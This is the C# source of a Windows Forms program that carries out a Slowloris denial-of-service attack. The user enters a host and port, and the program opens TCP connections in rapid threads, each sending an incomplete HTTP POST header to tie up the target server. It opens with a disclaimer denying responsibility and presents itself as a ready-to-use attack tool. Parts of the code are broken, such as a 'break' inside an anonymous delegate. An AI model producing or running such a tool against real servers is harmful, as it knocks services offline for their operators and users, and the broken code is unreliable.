using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace npfhttp
{
    public partial class npfhttp : Form
    {
        public bool loop = false;
        public string Website;
        public int count = 0;
        public int port;
        public int threadSleep;
        public int contint = 0;
        public npfhttp()
        {
            MessageBox.Show("DISCLAIMER: I am not responsible for any damages caused by this program. I have no liability for any problems cause by the program. Continue at your own risk.");
            InitializeComponent();
        }
        public void SlowlorisAttack(string Host, int Port, int ThreadSleep, bool Loop)
        {
            Website = Host;
            port = Port;
            loop = Loop;
            threadSleep = ThreadSleep;
        }
        public void Manage()
        {
            try
            {
                ThreadStart start = null;
                List<TcpClient> clients = new List<TcpClient>();

                while (loop)
                {
                    if (contint == 1)
                    {
                        break;
                    }

                    if (start == null)
                    {

                        start = delegate
                        {
                            TcpClient item = new TcpClient();
                            clients.Add(item);

                            try
                            {
                                item.Connect(Website, port);
                                StreamWriter writer = new StreamWriter(item.GetStream());
                                writer.Write("POST / HTTP/1.1\r\nHost: " + Website + "\r\nContent-length: 5235\r\n\r\n");
                                writer.Flush();
                                if (loop)
                                {
                                    MessageBox.Show("AMOUNT OF PACKETS SENT: " + count);

                                }
                                count++;

                            }
                            catch (Exception ex)
                            {
                                if (loop)
                                {
                                    MessageBox.Show("PACKETS WERE UNABLE TO REACH SERVER");
                                    break;
                                }
                                MessageBox.Show(ex.Message);
                                loop = false;
                            }
                        };
                    }


                    new Thread(start).Start();
                    //Thread.Sleep(1000); 
                    Thread.Sleep(threadSleep);
                }
                foreach (TcpClient client in clients)
                {

                    try
                    {
                        client.GetStream().Dispose();

                    }
                    catch (Exception ex)
                    {
                        MessageBox.Show(ex.Message);
                    }
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
            }
        }
        private void startbutton_Click(object sender, EventArgs e)
        {
            string hosttt = hostTB.Text;
            int porttt = Int32.Parse(portTB.Text);
            bool looop = true;
            SlowlorisAttack(hosttt, porttt, 0, looop);
            Manage();
        }
        private void stopBT_Click(object sender, EventArgs e)
        {
            contint = 1;
        }
    }
}
